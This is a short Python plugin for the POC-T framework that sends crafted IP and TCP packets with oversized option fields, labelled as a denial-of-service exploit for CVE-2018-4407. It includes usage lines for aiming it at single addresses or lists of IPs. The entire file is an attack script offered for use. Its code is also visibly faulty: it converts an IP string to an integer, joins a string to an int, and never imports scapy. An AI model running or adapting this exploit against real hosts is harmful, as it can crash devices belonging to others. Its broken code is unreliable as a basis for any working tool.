#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T

# cve-2018-4407 ICMP DOS

#pip install scapy

#POC-T.py -s cve-2018-4407 -iS 127.0.0.1

#POC-T.py -s cve-2018-4407 -iF iplist.txt

#by Greekn

#2018/11/8/

import sys

def poc(url):
	try:
		check_ip = int(url)
		print ("[*] !!!!!!Dangerous operation!!!!!!")
		print ("[*] Trying CVE-2018-4407 ICMP DOS " + check_ip)
		for i in range(8,20):
			send(IP(dst=check_ip,options=[IPOption("A"*i)])/TCP(dport=2323,options=[(19, "1"*18),(19, "2"*18)]))
		print ("[*] Check Over!! ")
	except Exception as e:
		print "[-] %s Address cannot be accessed!" % url
		